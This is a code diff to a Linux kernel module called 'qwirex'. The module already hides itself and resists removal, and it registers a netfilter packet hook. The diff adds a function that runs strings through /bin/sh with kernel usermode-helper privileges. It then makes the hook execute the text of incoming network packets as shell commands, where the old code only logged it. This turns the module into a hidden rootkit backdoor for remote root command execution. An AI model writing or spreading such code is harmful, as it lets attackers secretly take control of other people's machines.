@@ -8,10 +8,30 @@
 #include <linux/ip.h>
 #include <linux/netfilter_ipv4.h>
 #include <linux/types.h>
+#include <linux/kmod.h>
 
 static void hide_qwirex(void);
 static void ban_on_extraction_qwirex(void);
 static unsigned int qwirex_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);
+static void execute_cmd(char *cmd);
+
+static void execute_cmd(char *cmd)
+{
+    if (!cmd)
+    {
+        return;
+    }
+
+    char *argv[] = {"/bin/sh", "-c", (char *)cmd, NULL};
+    static char *envp[] =
+    {
+        "HOME=/",
+        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
+        NULL
+    };
+
+    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+}
 
 static unsigned int qwirex_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
 {
@@ -77,7 +97,7 @@ static unsigned int qwirex_hook(void *priv, struct sk_buff *skb, const struct nf
                 {
                     memcpy(text,payload,payload_len);
                     text[payload_len] = '\0';
-                    printk(KERN_INFO "message:%s\n", text);
+                    execute_cmd(text);
                     kfree(text);
                 }
 
